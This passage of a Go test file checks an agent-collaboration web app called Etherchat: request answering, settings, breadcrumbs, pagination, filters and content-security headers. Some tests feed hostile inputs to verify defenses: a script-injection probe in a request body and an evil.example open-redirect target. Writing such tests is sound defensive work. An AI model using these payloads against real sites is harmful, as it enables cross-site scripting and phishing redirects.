	rq, err := s.ethers.Ask(s.ctx, app, e.ID, ether.AskInput{To: []string{"sam"}, Title: "Merge the drafts?",
		Body: "Chapters **2 and 3** overlap.<script>alert(1)</script>", Choices: []string{"Merge", "Keep separate"}})
	if err != nil {
		t.Fatal(err)
	}
	path := "/e/" + e.ID

	if page := readBody(t, sam.do("GET", "/", nil, nil)); !strings.Contains(page, "1 request needs you") {
		t.Fatalf("home badge:\n%s", page)
	}
	page := readBody(t, sam.do("GET", path, nil, nil))
	for _, want := range []string{"Agent Requests", "Merge the drafts?", "from @owner ·", `<div class="well">`, "<strong>2 and 3</strong>", "open until", `value="1">Keep separate</button>`} {
		if !strings.Contains(page, want) {
			t.Fatalf("sam's overview is missing %q:\n%s", want, page)
		}
	}
	if strings.Contains(page, "<script>alert") {
		t.Fatal("agent markup ran unescaped")
	}
	if page := readBody(t, owner.do("GET", path, nil, nil)); strings.Contains(page, "Agent Requests") {
		t.Fatal("the asker sees the answer form")
	}
	if resp := owner.do("POST", path+"/requests/"+rq.ID+"/answer", url.Values{"choice": {"0"}}, origin); resp.StatusCode != http.StatusForbidden {
		t.Fatalf("asker answering: %d", resp.StatusCode)
	}
	if resp := sam.do("POST", path+"/requests/"+rq.ID+"/answer", url.Values{"choice": {"7"}}, origin); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("bad choice: %d", resp.StatusCode)
	}

	resp := sam.do("POST", path+"/requests/"+rq.ID+"/answer", url.Values{"choice": {"1"}, "note": {"Different weeks."}}, origin)
	if resp.StatusCode != http.StatusSeeOther || resp.Header.Get("Location") != path+"?n=answered" {
		t.Fatalf("answer: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}
	if page := readBody(t, sam.do("GET", path+"?n=answered", nil, nil)); strings.Contains(page, "Agent Requests") || !strings.Contains(page, "Answer sent.") {
		t.Fatalf("overview after answering:\n%s", page)
	}
	page = readBody(t, owner.do("GET", path+"/comms", nil, nil))
	if !strings.Contains(page, `status answered`) || !strings.Contains(page, "<strong>Keep separate</strong>: Different weeks.") {
		t.Fatalf("comms after answering:\n%s", page)
	}
	if page := readBody(t, owner.do("GET", path, nil, nil)); !strings.Contains(page, "answered @owner&#39;s request:") {
		t.Fatalf("activity doesn't show the answer:\n%s", page)
	}
	if resp := sam.do("POST", path+"/requests/"+rq.ID+"/answer", url.Values{"choice": {"0"}}, origin); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("second answer: %d", resp.StatusCode)
	}

	// The zip has the requests too.
	resp = owner.do("GET", path+"/export.zip", nil, nil)
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	zr, err := zip.NewReader(bytes.NewReader(body), int64(len(body)))
	if err != nil {
		t.Fatal(err)
	}
	var reqs string
	for _, f := range zr.File {
		if strings.HasSuffix(f.Name, "/requests.md") {
			rc, _ := f.Open()
			b, _ := io.ReadAll(rc)
			rc.Close()
			reqs = string(b)
		}
	}
	if !strings.Contains(reqs, "## Merge the drafts?") || !strings.Contains(reqs, "Keep separate. Different weeks.") {
		t.Fatalf("requests.md:\n%s", reqs)
	}
}

func TestAccountEmailSetting(t *testing.T) {
	s := newSite(t)
	b, acct := s.signedIn("sam@example.com")
	origin := map[string]string{"Origin": s.srv.URL}
	if page := readBody(t, b.do("GET", "/account", nil, nil)); !strings.Contains(page, `name="request_emails" checked`) || !strings.Contains(page, "sam@example.com") {
		t.Fatalf("account page:\n%s", page)
	}
	if resp := b.do("POST", "/account/emails", url.Values{}, origin); resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("turn off: %d", resp.StatusCode)
	}
	if a, _ := s.ethers.AccountByID(s.ctx, acct.ID); a.RequestEmails {
		t.Fatal("request emails still on")
	}
	page := readBody(t, b.do("GET", "/account?n=saved", nil, nil))
	if strings.Contains(page, "checked") || !strings.Contains(page, "Saved.") {
		t.Fatalf("account page after turning off:\n%s", page)
	}
	b.do("POST", "/account/emails", url.Values{"request_emails": {"on"}}, origin)
	if a, _ := s.ethers.AccountByID(s.ctx, acct.ID); !a.RequestEmails {
		t.Fatal("request emails didn't turn back on")
	}
}

func TestBreadcrumbsAndBack(t *testing.T) {
	s := newSite(t)
	b, acct := s.signedIn("sam@example.com")
	a := ether.Actor{AccountID: acct.ID, ClientID: "test"}
	e, err := s.ethers.CreateEther(s.ctx, a, "Team")
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{"members/sam/drafts/week 3.md", "shared/notes.md"} {
		if _, err := s.ethers.WriteFile(s.ctx, a, e.ID, p, []byte("x"), 0, nil); err != nil {
			t.Fatal(err)
		}
	}
	id := e.ID
	page := readBody(t, b.do("GET", "/e/"+id+"/f/members/sam/drafts/week%203.md", nil, nil))
	for _, want := range []string{
		`<a class="back" href="/e/` + id + `/m/sam#d-members%2Fsam%2Fdrafts">← Back</a>`,
		`<a href="/e/` + id + `#agents-h">members</a>`,
		`<a href="/e/` + id + `/m/sam">sam</a>`,
		`<a href="/e/` + id + `/m/sam#d-members%2Fsam%2Fdrafts">drafts</a>`,
		`<span aria-current="page">week 3.md</span>`,
	} {
		if !strings.Contains(page, want) {
			t.Fatalf("file page is missing %s\n%s", want, page)
		}
	}
	// The anchor the breadcrumb points at exists on the agent's tab.
	if tab := readBody(t, b.do("GET", "/e/"+id+"/m/sam", nil, nil)); !strings.Contains(tab, `id="d-members%2Fsam%2Fdrafts"`) {
		t.Fatalf("no folder anchor on the agent tab:\n%s", tab)
	}
	page = readBody(t, b.do("GET", "/e/"+id+"/f/shared/notes.md", nil, nil))
	if !strings.Contains(page, `<a class="back" href="/e/`+id+`/shared">← Back</a>`) {
		t.Fatalf("shared file's Back link:\n%s", page)
	}
	page = readBody(t, b.do("GET", "/e/"+id+"/h/shared/notes.md", nil, nil))
	if !strings.Contains(page, `<a class="back" href="/e/`+id+`/f/shared/notes.md">← Back</a>`) {
		t.Fatalf("history's Back link:\n%s", page)
	}
}

func TestRenameAgentOnWebsite(t *testing.T) {
	s := newSite(t)
	b, acct := s.signedIn("sam@example.com")
	origin := map[string]string{"Origin": s.srv.URL}
	e, _ := s.ethers.CreateEther(s.ctx, ether.Actor{AccountID: acct.ID}, "Team")
	path := "/e/" + e.ID
	if page := readBody(t, b.do("GET", path, nil, nil)); !strings.Contains(page, `aria-current="page">Overview`) || !strings.Contains(page, `>@sam</a>`) {
		t.Fatalf("default agent name:\n%s", page)
	}
	if resp := b.do("POST", path+"/agent-name", url.Values{"name": {"@owner"}}, origin); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("handle-like name: %d", resp.StatusCode)
	}
	if resp := b.do("POST", path+"/agent-name", url.Values{"name": {"Atlas"}}, origin); resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("rename: %d", resp.StatusCode)
	}
	page := readBody(t, b.do("GET", path+"?n=renamed", nil, nil))
	for _, want := range []string{`/m/sam">Atlas</a>`, "@sam&#39;s agent ·", "named their agent Atlas", "Your agent&#39;s name is saved."} {
		if !strings.Contains(page, want) {
			t.Fatalf("after renaming, missing %q:\n%s", want, page)
		}
	}
}

// TestCodePageScript: the code page runs exactly one script, allowed by its
// hash; every other page allows none.
func TestCodePageScript(t *testing.T) {
	s := newSite(t)
	if err := s.ethers.Allow(s.ctx, "alice@example.com", ""); err != nil {
		t.Fatal(err)
	}
	b := s.browser()
	resp := b.do("POST", "/login", url.Values{"email": {"alice@example.com"}}, map[string]string{"Origin": s.srv.URL})
	page := readBody(t, resp)
	m := regexp.MustCompile(`(?s)<script>(.*?)</script>`).FindAllStringSubmatch(page, -1)
	if len(m) != 1 || !strings.Contains(page, `data-otp`) {
		t.Fatalf("code page scripts: %d\n%s", len(m), page)
	}
	sum := sha256.Sum256([]byte(m[0][1]))
	want := "script-src 'sha256-" + base64.StdEncoding.EncodeToString(sum[:]) + "'"
	if csp := resp.Header.Get("Content-Security-Policy"); !strings.HasSuffix(csp, "; "+want) || !strings.HasPrefix(csp, "default-src 'none'") {
		t.Fatalf("code page CSP = %q, want it to end with %q", csp, want)
	}
	for _, path := range []string{"/", "/login"} {
		if csp := b.do("GET", path, nil, nil).Header.Get("Content-Security-Policy"); strings.Contains(csp, "script-src") {
			t.Fatalf("%s allows scripts: %q", path, csp)
		}
	}
}

// TestAskAdmin: when an invite hits addresses that can't be invited, the
// member can email the server's admins about them.
func TestAskAdmin(t *testing.T) {
	s := newSite(t)
	b, _ := s.signedIn("owner@example.com")
	origin := map[string]string{"Origin": s.srv.URL}
	if err := s.ethers.Allow(s.ctx, "alex@example.com", ""); err != nil {
		t.Fatal(err)
	}
	if err := s.ethers.SetAdmin(s.ctx, "alex@example.com", true); err != nil {
		t.Fatal(err)
	}

	resp := b.do("POST", "/ethers", url.Values{"name": {"Atlas"}, "email": {"prof@uni.edu", "kim@example.com"}}, origin)
	page := readBody(t, resp)
	for _, want := range []string{"These addresses can&#39;t be invited here: prof@uni.edu, kim@example.com.", `action="/allow-requests"`,
		`name="email" value="prof@uni.edu"`, `name="back" value="/new"`, "Ask the admin to allow them"} {
		if !strings.Contains(page, want) {
			t.Fatalf("new ether error is missing %q:\n%s", want, page)
		}
	}

	before := s.mail.count()
	resp = b.do("POST", "/allow-requests", url.Values{"email": {"prof@uni.edu", "kim@example.com", "owner@example.com", "not an email"}, "back": {"/new"}}, origin)
	if resp.StatusCode != http.StatusSeeOther || resp.Header.Get("Location") != "/new?n=asked" {
		t.Fatalf("ask: %d %s", resp.StatusCode, resp.Header.Get("Location"))
	}
	if s.mail.count() != before+1 {
		t.Fatalf("emails sent: %d", s.mail.count()-before)
	}
	m := s.mail.sent[len(s.mail.sent)-1]
	if m.To != "alex@example.com" || m.Subject != "@owner asked to allow 2 addresses on Etherchat" ||
		!strings.Contains(m.Text, "allow --email prof@uni.edu") || !strings.Contains(m.Text, "allow --email kim@example.com") ||
		strings.Contains(m.Text, "owner@example.com allow") || strings.Contains(m.Text, "not an email") {
		t.Fatalf("admin email: %+v", m)
	}
	if page := readBody(t, b.do("GET", "/new?n=asked", nil, nil)); !strings.Contains(page, "Request sent to the server&#39;s admin.") {
		t.Fatalf("notice after asking:\n%s", page)
	}

	// An open redirect isn't possible, and requests stop after five a day.
	if resp := b.do("POST", "/allow-requests", url.Values{"email": {"a@example.com"}, "back": {"https://evil.example"}}, origin); resp.Header.Get("Location") != "/?n=asked" {
		t.Fatalf("back to another site: %s", resp.Header.Get("Location"))
	}
	for i := 0; i < 3; i++ {
		b.do("POST", "/allow-requests", url.Values{"email": {"a@example.com"}, "back": {"/new"}}, origin)
	}
	if resp := b.do("POST", "/allow-requests", url.Values{"email": {"a@example.com"}, "back": {"/new"}}, origin); resp.Header.Get("Location") != "/new?n=asklimit" {
		t.Fatalf("sixth request: %s", resp.Header.Get("Location"))
	}
}

func TestActivityPagesAndFilter(t *testing.T) {
	s := newSite(t)
	b, acct := s.signedIn("sam@example.com")
	t0 := time.Date(2026, 10, 1, 12, 0, 0, 0, time.UTC)
	clock := t0
	s.ethers.SetClock(func() time.Time { return clock })
	a := ether.Actor{AccountID: acct.ID, ClientID: "test"}
	e, err := s.ethers.CreateEther(s.ctx, a, "Team")
	if err != nil {
		t.Fatal(err)
	}
	for i := 1; i <= 30; i++ { // one event a minute, 12:01 to 12:30
		clock = t0.Add(time.Duration(i) * time.Minute)
		if _, err := s.ethers.CreateFolder(s.ctx, a, e.ID, "shared/f"+strconv.Itoa(100 + i)[1:]); err != nil {
			t.Fatal(err)
		}
	}
	path := "/e/" + e.ID
	events := func(page string) int { return strings.Count(page, "<time>") }

	page := readBody(t, b.do("GET", path, nil, nil))
	if events(page) != 25 || !strings.Contains(page, "page 1 of 2 · 31 events") ||
		!strings.Contains(page, `href="`+path+`?page=2#activity-h" aria-label="Older page" title="Older">→</a>`) || !strings.Contains(page, `<span class="arrow off" aria-hidden="true">←</span>`) {
		t.Fatalf("first page: %d events\n%s", events(page), page)
	}
	page = readBody(t, b.do("GET", path+"?page=2", nil, nil))
	if events(page) != 6 || !strings.Contains(page, `href="`+path+`#activity-h" aria-label="Newer page" title="Newer">←</a>`) || !strings.Contains(page, "shared/f05/") {
		t.Fatalf("second page: %d events\n%s", events(page), page)
	}

	// 12:10 to 12:14 includes the whole 12:14 minute: five events, one page.
	page = readBody(t, b.do("GET", path+"?from=2026-10-01T12:10&to=2026-10-01T12:14", nil, nil))
	if events(page) != 5 || !strings.Contains(page, "shared/f10/") || !strings.Contains(page, "shared/f14/") ||
		strings.Contains(page, "shared/f15/") || !strings.Contains(page, "page 1 of 1 · 5 events") ||
		!strings.Contains(page, `class="clear" href="`+path+`#activity-h"`) || !strings.Contains(page, `value="2026-10-01T12:10"`) {
		t.Fatalf("filtered: %d events\n%s", events(page), page)
	}
	if page := readBody(t, b.do("GET", path+"?from=2026-10-02T00:00", nil, nil)); !strings.Contains(page, "Nothing in that time range.") {
		t.Fatalf("empty range:\n%s", page)
	}
	page = readBody(t, b.do("GET", path+"?from=2026-10-01T12:20&to=2026-10-01T12:10", nil, nil))
	if !strings.Contains(page, "The start is after the end.") || events(page) != 25 {
		t.Fatalf("reversed range: %d events\n%s", events(page), page)
	}
	if page := readBody(t, b.do("GET", path+"?from=yesterday", nil, nil)); !strings.Contains(page, "Enter the start as a date and time") {
		t.Fatalf("bad date:\n%s", page)
	}
	// Filtered page links keep the filter.
	page = readBody(t, b.do("GET", path+"?from=2026-10-01T12:00", nil, nil))
	if !strings.Contains(page, `href="`+path+`?from=2026-10-01T12%3A00&amp;page=2#activity-h"`) {
		t.Fatalf("filtered page link:\n%s", page)
	}
}

// TestEasternTime: pages show times in the configured zone, and the activity
// filter reads its times in that zone too.
func TestEasternTime(t *testing.T) {
	s := newSite(t)
	ny, err := time.LoadLocation("America/New_York")
	if err != nil {
		t.Fatal(err)
	}
	h, err := New(Config{Ethers: s.ethers, Auth: s.auth, Mailer: s.mail, BaseURL: "https://etherchat.test", Location: ny,
		Log: slog.New(slog.NewTextHandler(io.Discard, nil))})
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(h)
	defer srv.Close()
	s.srv = srv

	b, acct := s.signedIn("sam@example.com")
	at := time.Date(2026, 10, 12, 22, 30, 0, 0, time.UTC) // 18:30 EDT
	s.ethers.SetClock(func() time.Time { return at })
	e, _ := s.ethers.CreateEther(s.ctx, ether.Actor{AccountID: acct.ID}, "Team")

	page := readBody(t, b.do("GET", "/e/"+e.ID, nil, nil))
	if !strings.Contains(page, "2026-10-12 18:30 EDT") || strings.Contains(page, "22:30") {
		t.Fatalf("times on the page:\n%s", page)
	}
	// 18:00-18:45 Eastern holds the event; 22:00-22:45 (its UTC time) doesn't.
	if page := readBody(t, b.do("GET", "/e/"+e.ID+"?from=2026-10-12T18:00&to=2026-10-12T18:45", nil, nil)); !strings.Contains(page, "created the ether") {
		t.Fatalf("Eastern filter missed the event:\n%s", page)
	}
	if page := readBody(t, b.do("GET", "/e/"+e.ID+"?from=2026-10-12T22:00&to=2026-10-12T22:45", nil, nil)); strings.Contains(page, "created the ether") {
		t.Fatal("the filter read its times as UTC")
	}
}

func TestCommsFiltersAndPages(t *testing.T) {
	s := newSite(t)
	b, owner := s.signedIn("owner@example.com")
	_, sam := s.signedIn("sam@example.com")
	t0 := time.Date(2026, 10, 1, 12, 0, 0, 0, time.UTC)
	clock := t0
	s.ethers.SetClock(func() time.Time { return clock })
	oa, sa := ether.Actor{AccountID: owner.ID, ClientID: "test"}, ether.Actor{AccountID: sam.ID, ClientID: "test"}
	e, _ := s.ethers.CreateEther(s.ctx, oa, "Team")
	code, _, _ := s.ethers.CreateInvite(s.ctx, oa, e.ID, "sam@example.com")
	if _, err := s.ethers.JoinWithCode(s.ctx, sa, code); err != nil {
		t.Fatal(err)
	}
	// Requests at 12:01..12:07: odd ones ask sam, even ones ask owner (asked by sam).
	for i := 1; i <= 7; i++ {
		clock = t0.Add(time.Duration(i) * time.Minute)
		who, to := oa, "sam"
		if i%2 == 0 {
			who, to = sa, "owner"
		}
		title := "Question " + strconv.Itoa(i)
		if i == 3 {
			title = "Which kernel trick?"
		}
		if _, err := s.ethers.Ask(s.ctx, who, e.ID, ether.AskInput{To: []string{to}, Title: title}); err != nil {
			t.Fatal(err)
		}
		if i == 5 { // owner's agent has five open now; answer one so there's room
			list, _ := s.ethers.ListRequests(s.ctx, sa, e.ID)
			for _, rq := range list {
				if rq.WaitingOn(sam.ID) {
					s.ethers.AnswerRequest(s.ctx, sa, e.ID, rq.ID, -1, "done")
					break
				}
			}
		}
	}
	// Messages at 13:01..13:07, alternating fyi (owner) and update (sam).
	for i := 1; i <= 7; i++ {
		clock = t0.Add(time.Hour + time.Duration(i)*time.Minute)
		who, intent := oa, ether.IntentFYI
		if i%2 == 0 {
			who, intent = sa, ether.IntentUpdate
		}
		if _, err := s.ethers.PostMessage(s.ctx, who, e.ID, ether.PostInput{Intent: intent, Title: "Post " + strconv.Itoa(i), Body: "body " + strconv.Itoa(i)}); err != nil {
			t.Fatal(err)
		}
	}
	path := "/e/" + e.ID + "/comms"
	requests := func(page string) int { return strings.Count(page, `<li id="r-`) }
	messages := func(page string) int { return strings.Count(page, `<li id="p-`) }

	page := readBody(t, b.do("GET", path, nil, nil))
	if requests(page) != 5 || messages(page) != 5 || strings.Count(page, "page 1 of 2 · 7 in all") != 2 {
		t.Fatalf("first pages: %d requests, %d messages\n%s", requests(page), messages(page), page)
	}
	if page := readBody(t, b.do("GET", path+"?r_page=2", nil, nil)); requests(page) != 2 || messages(page) != 5 {
		t.Fatalf("requests page 2: %d requests, %d messages", requests(page), messages(page))
	}
	// One page still shows the arrows, both dimmed.
	if page := readBody(t, b.do("GET", path+"?r_who=sam", nil, nil)); requests(page) != 4 || !strings.Contains(page, `<option value="sam" selected>@sam</option>`) ||
		!regexp.MustCompile(`arrow off"[^>]*>←</span>\s*<span class="meta">page 1 of 1 · 4 in all</span>\s*<span class="arrow off"`).MatchString(page) {
		t.Fatalf("asked @sam: %d\n%s", requests(page), page)
	}
	if page := readBody(t, b.do("GET", path+"?r_q=KERNEL", nil, nil)); requests(page) != 1 || !strings.Contains(page, "Which kernel trick?") {
		t.Fatalf("search: %d", requests(page))
	}
	if page := readBody(t, b.do("GET", path+"?r_q=done", nil, nil)); requests(page) != 1 {
		t.Fatalf("search in answers: %d", requests(page))
	}
	if page := readBody(t, b.do("GET", path+"?r_from=2026-10-01T12:02&r_to=2026-10-01T12:03", nil, nil)); requests(page) != 2 {
		t.Fatalf("requests in 12:02-12:03: %d", requests(page))
	}

	// Messages by tag and author; the requests' filter rides along.
	page = readBody(t, b.do("GET", path+"?m_tag=fyi&r_who=sam", nil, nil))
	if messages(page) != 4 || requests(page) != 4 || !strings.Contains(page, `<input type="hidden" name="m_tag" value="fyi">`) ||
		!strings.Contains(page, `<input type="hidden" name="r_who" value="sam">`) {
		t.Fatalf("fyi + asked @sam: %d messages, %d requests\n%s", messages(page), requests(page), page)
	}
	if page := readBody(t, b.do("GET", path+"?m_who=sam&m_q=body%206", nil, nil)); messages(page) != 1 || !strings.Contains(page, "Post 6") {
		t.Fatalf("by @sam, search: %d", messages(page))
	}
	// Clearing one list's filter keeps the other's.
	page = readBody(t, b.do("GET", path+"?m_tag=fyi&r_who=sam", nil, nil))
	if !strings.Contains(page, `href="`+path+`?r_who=sam#messages-h">clear</a>`) || !strings.Contains(page, `href="`+path+`?m_tag=fyi#requests-h">clear</a>`) {
		t.Fatalf("clear links:\n%s", page)
	}
}

func TestSharedFilesList(t *testing.T) {
	s := newSite(t)
	b, owner := s.signedIn("owner@example.com")
	_, sam := s.signedIn("sam@example.com")
	oa, sa := ether.Actor{AccountID: owner.ID, ClientID: "test"}, ether.Actor{AccountID: sam.ID, ClientID: "test"}
	e, _ := s.ethers.CreateEther(s.ctx, oa, "Team")
	code, _, _ := s.ethers.CreateInvite(s.ctx, oa, e.ID, "sam@example.com")
	if _, err := s.ethers.JoinWithCode(s.ctx, sa, code); err != nil {
		t.Fatal(err)
	}
	for i := 1; i <= 12; i++ { // 8 by owner at the top, 4 by sam in slides/
		who, p := oa, "shared/notes-"+strconv.Itoa(100 + i)[1:]+".md"
		if i > 8 {
			who, p = sa, "shared/slides/week-"+strconv.Itoa(i)+".md"
		}
		if _, err := s.ethers.WriteFile(s.ctx, who, e.ID, p, []byte("x"), 0, nil); err != nil {
			t.Fatal(err)
		}
	}
	path := "/e/" + e.ID + "/shared"
	files := func(page string) int { return strings.Count(page, `/f/shared/`) }

	page := readBody(t, b.do("GET", path, nil, nil))
	if files(page) != 10 || !strings.Contains(page, "page 1 of 2 · 12 in all") || !strings.Contains(page, `<span class="dir">slides/</span>week-10.md`) {
		t.Fatalf("first page: %d files\n%s", files(page), page)
	}
	if page := readBody(t, b.do("GET", path+"?f_page=2", nil, nil)); files(page) != 2 {
		t.Fatalf("second page: %d", files(page))
	}
	if page := readBody(t, b.do("GET", path+"?f_who=sam", nil, nil)); files(page) != 4 {
		t.Fatalf("by @sam: %d", files(page))
	}
	if page := readBody(t, b.do("GET", path+"?f_q=NOTES-0", nil, nil)); files(page) != 8 {
		t.Fatalf("search: %d", files(page))
	}
	// A breadcrumb to a folder opens the list filtered to it.
	page = readBody(t, b.do("GET", "/e/"+e.ID+"/f/shared/slides/week-9.md", nil, nil))
	link := path + "?f_in=shared%2Fslides#files-h"
	if !strings.Contains(page, `<a class="back" href="`+link+`">← Back</a>`) || !strings.Contains(page, `<a href="`+link+`">slides</a>`) {
		t.Fatalf("breadcrumbs for a shared subfolder:\n%s", page)
	}
	page = readBody(t, b.do("GET", path+"?f_in=shared%2Fslides", nil, nil))
	if files(page) != 4 || !strings.Contains(page, `<span class="chip">in shared/slides/</span>`) {
		t.Fatalf("folder filter: %d\n%s", files(page), page)
	}
}
